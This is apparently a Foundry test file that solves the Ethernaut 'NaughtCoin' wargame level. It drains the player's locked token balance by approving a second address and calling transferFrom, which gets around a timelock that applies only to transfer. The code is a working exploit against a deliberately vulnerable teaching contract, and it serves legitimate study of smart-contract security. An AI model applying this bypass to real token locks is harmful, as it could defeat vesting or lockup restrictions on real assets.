// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {NaughtCoinFactory} from "src/levels/NaughtCoinFactory.sol";
import {NaughtCoin} from "src/levels/NaughtCoin.sol";
import "forge-std/Test.sol";

contract NaughtCoinTest is Test {
    NaughtCoinFactory factory;
    NaughtCoin naughtCoin;
    address private attacker = makeAddr("0x111");
    address private attacker2 = makeAddr("0x222");

    function setUp() external {
        factory = new NaughtCoinFactory();
        address naughtCoinAddr = factory.createInstance(attacker);
        naughtCoin = NaughtCoin(naughtCoinAddr);
    }

    function test_NaughtCoinHack() external {
        uint256 attackerBalance = naughtCoin.balanceOf(attacker);

        // approve other address to spend tokens
        vm.prank(attacker);
        naughtCoin.approve(attacker2, attackerBalance);

        // transfer all tokens using approved address
        vm.prank(attacker2);
        naughtCoin.transferFrom(attacker, attacker2, attackerBalance);

        assertEq(
            naughtCoin.balanceOf(attacker),
            0,
            "Failed to drain the contract_1"
        );
        assertEq(
            naughtCoin.balanceOf(attacker2),
            attackerBalance,
            "Failed to drain the contract_2"
        );

        bool success = factory.validateInstance(
            payable(address(naughtCoin)),
            attacker
        );
        assertTrue(success, "Failed to validate the instance");
    }
}
